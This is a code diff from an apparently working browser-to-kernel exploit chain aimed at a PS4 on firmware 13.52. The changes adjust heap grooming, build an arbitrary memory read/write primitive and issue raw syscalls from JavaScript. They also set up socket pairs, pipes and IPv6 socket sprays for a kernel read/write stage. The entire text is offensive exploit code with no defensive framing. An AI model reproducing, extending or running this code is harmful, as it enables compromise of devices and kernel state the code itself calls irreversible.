@@ -1,7 +1,7 @@
 // ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
 // module record and releaseFakeCell() (only call site: mem.js:662) reaches a
 // virgin instance, pinning ~137 MB for the life of the page.
-import { establishPrimitive, dropGroomFootprint } from "./core.mjs?v=12";
+import { establishPrimitive, dropGroomFootprint } from "./core.mjs?v=13";
 import { installWindowP, pairStatus } from "./mem.mjs";
 import { int64 } from "./int64.mjs";
 import { offsetsFor } from "./ps4_13.52.mjs";
@@ -159,7 +159,7 @@ let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false
 
 let allDone = false;
 
-const CHAIN_BUILD = "plop-13.52-2026-03-26-lazy-workers";
+const CHAIN_BUILD = "plop-13.52-2026-03-26-pre-pin-slim";
 
 (async function () {
     let p = null;
@@ -320,15 +320,18 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-lazy-workers";
             mark("GROOM-DROP-CHAIN", "dropped=" + (gd.dropped ? 1 : 0)
                 + (gd.reason ? " reason=" + gd.reason : ""));
             const COLLECT_CYCLES = params.has("collect")
-                ? parseInt(params.get("collect"), 10) : 10;
+                ? parseInt(params.get("collect"), 10) : 0;
             const COLLECT_MB = params.has("collectmb")
-                ? parseInt(params.get("collectmb"), 10) : 2;
+                ? parseInt(params.get("collectmb"), 10) : 0;
             const COLLECT_MS = params.has("collectms")
                 ? parseInt(params.get("collectms"), 10) : 55;
             if (COLLECT_CYCLES > 0)
                 await groomCollect(COLLECT_CYCLES, COLLECT_MB, COLLECT_MS,
                     "post-groom-drop", null);
         }
+        logQuiet = params.get("domlog") !== "1";
+        lines.length = 0;
+        if (outEl) outEl.textContent = "";
         mark("PRIMITIVE-OK", "");
 
         const meas = measureBases1352(p, off);
@@ -641,47 +644,48 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-lazy-workers";
             return { rv: r, err: r === -1 ? errno() : 0 };
         }
 
-        const iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV);
-        const msgAb = new ArrayBuffer(MSGHDR_SIZE);
-        keepAlive.push(iovAb, msgAb);
-        const iovAddr = bufAddr(iovAb), msgAddr = bufAddr(msgAb);
-        const iovDv = new DataView(iovAb), msgDv = new DataView(msgAb);
-
-        new Uint8Array(iovAb).fill(0);
-        put(iovDv, 0, 1);
-        put(iovDv, 8, 1);
-        new Uint8Array(msgAb).fill(0);
-        put(msgDv, 0x10, iovAddr);
-        msgDv.setInt32(0x18, NUM_MSG_IOV, true);
-
-        logQuiet = params.get("domlog") !== "1";
-        state("setting up...", "warn");
-        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
-            throw new Error("socketpair failed");
-        const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
-        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
-            throw new Error("uio socketpair failed");
-        const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
-        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(","));
-
-        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
-        const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
-        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
-        const slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
-        check("karw-pipe-pairs-exist",
-            masterPipe[0] > 0 && masterPipe[1] > 0
-            && slavePipe[0] > 0 && slavePipe[1] > 0,
-            "master " + masterPipe + "  slave " + slavePipe);
-
-        const dummyAb = new ArrayBuffer(0x1000); keepAlive.push(dummyAb);
-        new Uint8Array(dummyAb).fill(0x41);
-        const dummyAddr = bufAddr(dummyAb);
-        const uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
-        keepAlive.push(uioIovAb);
-        const uioIovAddr = bufAddr(uioIovAb), uioIovDv = new DataView(uioIovAb);
-
-        new Uint8Array(uioIovAb).fill(0);
-        put(uioIovDv, 0, dummyAddr);
+        let iovAb, msgAb, iovAddr, msgAddr, iovDv, msgDv;
+        let iovSs, uioSs, masterPipe, slavePipe;
+        let dummyAb, dummyAddr, uioIovAb, uioIovAddr, uioIovDv;
+        let karwReady = false;
+        function ensureKarwSetup() {
+            if (karwReady) return;
+            iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV);
+            msgAb = new ArrayBuffer(MSGHDR_SIZE);
+            keepAlive.push(iovAb, msgAb);
+            iovAddr = bufAddr(iovAb); msgAddr = bufAddr(msgAb);
+            iovDv = new DataView(iovAb); msgDv = new DataView(msgAb);
+            new Uint8Array(iovAb).fill(0);
+            put(iovDv, 0, 1);
+            put(iovDv, 8, 1);
+            new Uint8Array(msgAb).fill(0);
+            put(msgDv, 0x10, iovAddr);
+            msgDv.setInt32(0x18, NUM_MSG_IOV, true);
+            if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
+                throw new Error("socketpair failed");
+            iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
+            if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
+                throw new Error("uio socketpair failed");
+            uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
+            post("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(","));
+            if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
+            masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
+            if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
+            slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
+            check("karw-pipe-pairs-exist",
+                masterPipe[0] > 0 && masterPipe[1] > 0
+                && slavePipe[0] > 0 && slavePipe[1] > 0,
+                "master " + masterPipe + "  slave " + slavePipe);
+            dummyAb = new ArrayBuffer(0x1000); keepAlive.push(dummyAb);
+            new Uint8Array(dummyAb).fill(0x41);
+            dummyAddr = bufAddr(dummyAb);
+            uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
+            keepAlive.push(uioIovAb);
+            uioIovAddr = bufAddr(uioIovAb); uioIovDv = new DataView(uioIovAb);
+            new Uint8Array(uioIovAb).fill(0);
+            put(uioIovDv, 0, dummyAddr);
+            karwReady = true;
+        }
         const ipv6 = [];
         let NUM_IPV6_SOCK = NUM_IPV6_SOCK_DEFAULT;
         if (params.has("ipv6")) {
@@ -829,7 +833,8 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-lazy-workers";
             mark("WORKER-ATTRS-RESTORED", "at=" + why + " n=" + wr + "/" + wn);
         }
         restoreCtx = { restore: restoreThreadAttrs };
-        mark("THREAD-ATTRS-SAVED", "mask=" + savedMask
+        dropGroomFootprint();
+        post("THREAD-ATTRS-SAVED", "mask=" + savedMask
             + " rtprio={" + savedPrio + "}");
 
         async function jscBreath(n, why) {
@@ -837,11 +842,9 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-lazy-workers";
                 await new Promise(r => setTimeout(r, 0));
                 sc(SYS.sched_yield);
             }
-            mark("JSC-BREATH", "done n=" + n + " at=" + why);
+            post("JSC-BREATH", "done n=" + n + " at=" + why);
         }
-        dropGroomFootprint();
-        lines.length = 0;
-        await groomCollect(8, 0, 45, "pre-main-pin", () => sc(SYS.sched_yield));
+        for (let y = 0; y < 8; ++y) sc(SYS.sched_yield);
 
         prioDv.setUint16(0, RTP_PRIO_REALTIME, true);
         prioDv.setUint16(2, RTP, true);
@@ -1038,6 +1041,8 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-lazy-workers";
             "boot=" + (boot || "none") + " last=" + (lastCommitted || "none"));
 
         let twins = null, triplets = null;
+
+        ensureKarwSetup();
 
         // ITEM 6(d). `committed` means "kernel state irreversibly touched" --
         // reboot bookkeeping, not a reason to refuse a retry. Gate the loop on
